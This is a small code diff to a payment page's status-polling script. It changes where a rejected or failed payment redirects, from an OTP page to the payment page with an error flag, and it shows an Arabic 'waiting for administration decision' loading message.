@@ -977,7 +977,7 @@
           } else if (st === 'reject' || st === 'declined' || st === 'error') {
             clearInterval(statusPollTimer);
             document.getElementById('loadingOverlay').classList.remove('active');
-            window.location.href = 'otp.html?error=1&id=' + paymentId;
+            window.location.href = 'payment.html?error=1&id=' + paymentId;
           } else if (st === 'pending') {
             document.getElementById('loadingOverlay').classList.add('active');
             document.querySelector('.loading-text').textContent = 'بانتظار قرار الإدارة... يرجى الانتظار';
